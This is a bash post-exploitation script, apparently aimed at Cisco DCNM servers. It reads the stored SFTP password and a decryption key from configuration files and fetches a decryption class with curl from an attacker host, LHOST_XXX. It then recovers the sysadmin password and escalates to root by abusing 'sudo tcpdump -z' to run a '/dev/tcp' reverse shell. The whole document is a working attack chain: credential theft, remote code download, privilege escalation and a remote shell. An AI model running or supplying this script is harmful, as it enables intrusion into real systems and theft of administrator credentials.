#!/bin/bash

# obtain sysadmin password and decryption key (NOTE: can these regexes fail?)
PASSWORD=`cat /usr/local/cisco/dcm/fm/conf/server.properties  | grep 'server.sftp.password' | grep -o '#.*'`
KEY=`cat /usr/local/cisco/dcm/fm/conf/serverstore.properties | grep 'dcnm.store' | grep -o 'MASK-.*'`

# download decryption class
curl 'LHOST_XXX:4445/DCNMCrypto.class' -o /tmp/DCNMCrypto.class

# change to /tmp/ before executing the decryption class
cd /tmp
SYSADMINPW=`/usr/local/cisco/dcm/java/jdk11/bin/java DCNMCrypto "$PASSWORD" "$KEY"`
rm /tmp/DCNMCrypto.class

# create Shelly
cat <<EOF > /tmp/shelly.sh
#!/bin/bash
TF=\$(mktemp)
echo "bash -i >& /dev/tcp/LHOST_XXX/4446 0>&1" > \$TF
chmod 777 \$TF
PASS=\`cat /tmp/pass\`
echo "\$PASS" | sudo -S tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF -Z root
EOF

# dump the password to a file we can read with the script above and
# make both files readable by sysadmin
# NOTE: pass with special chars might create trouble here?
echo $SYSADMINPW > /tmp/pass
chmod 777 /tmp/shelly.sh /tmp/pass

# get reverse root shell
echo "$SYSADMINPW" | su - sysadmin -c '/tmp/shelly.sh'

bash -i >& /dev/tcp/LHOST_XXX/4446 0>&1

# cleanup (this appears to be safe, we still get a shell)
rm /tmp/shelly.sh /tmp/pass
